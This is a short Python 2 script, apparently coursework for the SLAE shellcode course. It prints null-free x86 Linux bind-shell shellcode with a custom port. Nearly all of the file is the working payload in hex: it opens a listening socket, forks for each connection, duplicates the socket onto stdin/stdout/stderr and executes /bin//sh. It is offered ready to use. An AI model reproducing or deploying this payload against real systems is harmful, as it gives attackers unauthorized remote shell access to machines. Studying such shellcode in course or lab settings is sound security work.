#!/usr/bin/python
# Title:      Simple wrapper to generate bind shell shellcode with custom port number
# Author:     Amine Kanane <aminekanane_93@hotmail.com>
# Student-ID: SLAE - 1203
# Desc:       Simple wrapper to generate a shellcode with custom port number.
#             The generated shellcode is a Null Free bind shell + fork() for multiple use

import sys

port_default = 9443 # please provide a 4 digit port number, otherwhise you will break the shellcode :-)

def transform_port(port=port_default):
    value = hex(port)[2:]
    code = "\\x"+value[0:2]+"\\x"+value[2:4]
    return code


def generate(port=port_default):
    if len(str(port)) != 4:
        print "[x] Please provide a 4 digit port number, otherwhise you will break the shellcode :-) "
        sys.exit(-1)
    shellcode = ""
    shellcode += "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8"
    shellcode += "\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3"
    shellcode += "\\x66\\xb8\\x69\\x01\\x52\\x66\\x68"
    #shellcode += "\\x24\\xe3" # ==> port number = 9443; sock_ad.sin_port = htons(9443);
    shellcode += transform_port(port)
    shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x66"
    shellcode += "\\xb8\\x6b\\x01\\x31\\xc9\\xcd\\x80\\x31\\xd2\\x31"
    shellcode += "\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x89\\xc6\\x31"
    shellcode += "\\xc0\\xb0\\x02\\xcd\\x80\\x31\\xff\\x39\\xf8\\x75"
    shellcode += "\\xe8\\x31\\xc0\\xb0\\x06\\xcd\\x80\\x89\\xf3\\xb1"
    shellcode += "\\x02\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79\\xf8\\x31"
    shellcode += "\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68"
    shellcode += "\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1"
    shellcode += "\\xb0\\x0b\\xcd\\x80";
    return shellcode

if len(sys.argv) > 1:
    print generate(int(sys.argv[1]))
else:
    print generate()
